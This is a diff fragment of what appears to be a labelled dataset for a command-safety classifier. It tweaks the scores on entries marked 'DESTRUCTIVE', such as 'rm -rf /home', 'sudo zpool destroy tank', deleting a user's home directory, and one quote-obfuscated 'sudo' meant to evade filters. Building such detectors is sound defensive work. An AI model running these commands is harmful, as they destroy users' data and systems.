       "command": "rm -r tests || true",
       "label": "DESTRUCTIVE",
-      "score": 1.8135281689129366
+      "score": 1.8135281689129363
     },
     {
       "command": "rm -rf /home ; true",
@@ -1441,7 +1441,7 @@
     {
       "command": "rm -rf ~/Documents/thesis >/dev/null",
       "label": "DESTRUCTIVE",
-      "score": 1.9012845306593313
+      "score": 1.9012845306593318
     },
     {
       "command": "s\"\"udo  zpool destroy tank",
@@ -1456,7 +1456,7 @@
     {
       "command": "sh -c 'find /etc -name '*.pyc' -exec rm -rf {} \\;'",
       "label": "DESTRUCTIVE",
-      "score": 1.9817403870303842
+      "score": 1.9817403870303847
     },
     {
       "command": "sh -c 'rm -fr .*'",
@@ -1471,7 +1471,7 @@
     {
       "command": "sudo apt remove --purge python3 # cleanup",
       "label": "DESTRUCTIVE",
-      "score": 1.642894424194364
+      "score": 1.6428944241943646
     },
     {
       "command": "sudo deluser --remove-home bob >/dev/null",
